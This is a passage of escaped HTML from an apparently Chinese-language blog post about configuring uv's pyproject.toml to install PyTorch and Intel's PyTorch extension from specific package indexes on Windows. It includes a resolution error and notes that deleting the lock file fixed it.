&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;sources&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;intel-extension-for-pytorch&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-literal z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;oneccl_bind_pt&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-literal z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;torch&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-array z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;  &lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-array z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;torchvision&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-array z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;  &lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-array z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-begin z-toml&quot;&gt;[[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-array z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-end z-toml&quot;&gt;]]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;pytorch-extension.intel.com&#x2F;release-whl&#x2F;stable&#x2F;cpu&#x2F;us&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;explicit&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-toml&quot;&gt;true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-begin z-toml&quot;&gt;[[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-array z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-end z-toml&quot;&gt;]]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;name&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;url&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;https:&#x2F;&#x2F;download.pytorch.org&#x2F;whl&#x2F;cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;explicit&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-constant z-language z-toml&quot;&gt;true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; [[index]]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; url = &amp;quot;https:&#x2F;&#x2F;test.pypi.org&#x2F;simple&amp;quot;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; default = true&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-comment z-line z-number-sign z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-toml&quot;&gt;#&lt;&#x2F;span&gt; [tool.uv.pip]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;guan-yu-yi-ge-bao-cuo&quot;&gt;关于一个报错&lt;a class=&quot;zola-anchor&quot; href=&quot;#guan-yu-yi-ge-bao-cuo&quot; aria-label=&quot;Anchor link for: guan-yu-yi-ge-bao-cuo&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash z-code&quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;PS&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; D:&lt;span class=&quot;z-constant z-character z-escape z-shell&quot;&gt;\3&lt;&#x2F;span&gt;rdWinterVacation&lt;span class=&quot;z-constant z-character z-escape z-shell&quot;&gt;\a&lt;&#x2F;span&gt;cadamic&lt;span class=&quot;z-constant z-character z-escape z-shell&quot;&gt;\D&lt;&#x2F;span&gt;G&lt;span class=&quot;z-constant z-character z-escape z-shell&quot;&gt;\D&lt;&#x2F;span&gt;ofeandCDDSA&lt;span class=&quot;z-keyword z-operator z-assignment z-redirection z-shell&quot;&gt;&amp;gt;&lt;&#x2F;span&gt; uv add medpy opencv-python segmentation-models-pytorch tensorboard torch torchvision yacs matplotlib &lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;Resolved&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; 64 packages in 1.85s                                                                                                                                         &lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;error:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; Distribution &lt;span class=&quot;z-meta z-group z-expansion z-command z-backticks z-shell&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-shell&quot;&gt;`&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-readwrite z-assignment z-shell&quot;&gt;torch&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-shell&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-unquoted z-shell&quot;&gt;=2.6.0&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;@&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; registry+https:&#x2F;&#x2F;download.pytorch.org&#x2F;whl&#x2F;cpu&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-shell&quot;&gt;`&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; can&lt;span class=&quot;z-string z-quoted z-single z-shell&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-shell&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;t be installed because it doesn&lt;span class=&quot;z-punctuation z-definition z-string z-end z-shell&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;t have a source distribution or wheel for the current platform&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-shell z-bash&quot;&gt;&lt;span class=&quot;z-meta z-function-call z-shell&quot;&gt;&lt;span class=&quot;z-variable z-function z-shell&quot;&gt;hint:&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-arguments z-shell&quot;&gt; You&lt;span class=&quot;z-string z-quoted z-single z-shell&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-shell&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;re on Windows (`win_amd64`), but `torch` (v2.6.0) only has wheels for the following platform: `macosx_11_0_arm64`
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这个错误在&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;astral-sh&#x2F;uv&#x2F;issues&#x2F;10843#issuecomment-2607649056&quot;&gt;uv&#x2F;issues&#x2F;10843&lt;&#x2F;a&gt; 得到解决，删除lock文件即可，但不知道这个是否为最优做法。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;guan-yu-zhi-qian-de-yi-ge-bao-cuo-jiu-shi-wu-fa-cong-jing-xiang-yuan-li-mian-xia-zai-torch&quot;&gt;关于之前的一个报错，就是无法从镜像源里面下载torch&lt;a class=&quot;zola-anchor&quot; href=&quot;#guan-yu-zhi-qian-de-yi-ge-bao-cuo-jiu-shi-wu-fa-cong-jing-xiang-yuan-li-mian-xia-zai-torch&quot; aria-label=&quot;Anchor link for: guan-yu-zhi-qian-de-yi-ge-bao-cuo-jiu-shi-wu-fa-cong-jing-xiang-yuan-li-mian-xia-zai-torch&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;参考：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;blog.csdn.net&#x2F;YY007H&#x2F;article&#x2F;details&#x2F;141962724&quot;&gt;如何使用pip从镜像源里面下载torch+cuda&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;toml&quot; class=&quot;language-toml z-code&quot;&gt;&lt;code class=&quot;language-toml&quot; data-lang=&quot;toml&quot;&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;sources&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;intel-extension-for-pytorch&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-literal z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;oneccl_bind_pt&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-single z-literal z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;torch-intel&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;torch&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-array z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;  &lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-array z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;torchvision&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-array z-begin z-toml&quot;&gt;[&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;  &lt;span class=&quot;z-punctuation z-definition z-inline-table z-begin z-toml&quot;&gt;{&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-tag z-key z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-tag z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-key-value z-toml&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-string z-quoted z-double z-basic z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;pytorch-cpu&lt;span class=&quot;z-punctuation z-definition z-string z-end z-toml&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-punctuation z-definition z-inline-table z-end z-toml&quot;&gt;}&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-array z-toml&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-array z-end z-toml&quot;&gt;]&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-toml&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-begin z-toml&quot;&gt;[[&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-tag z-table z-array z-toml&quot;&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;tool&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;uv&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-table z-toml&quot;&gt;.&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-table z-toml&quot;&gt;index&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-table z-array z-end z-toml&quot;&gt;]]&lt;&#x2F;span&gt;
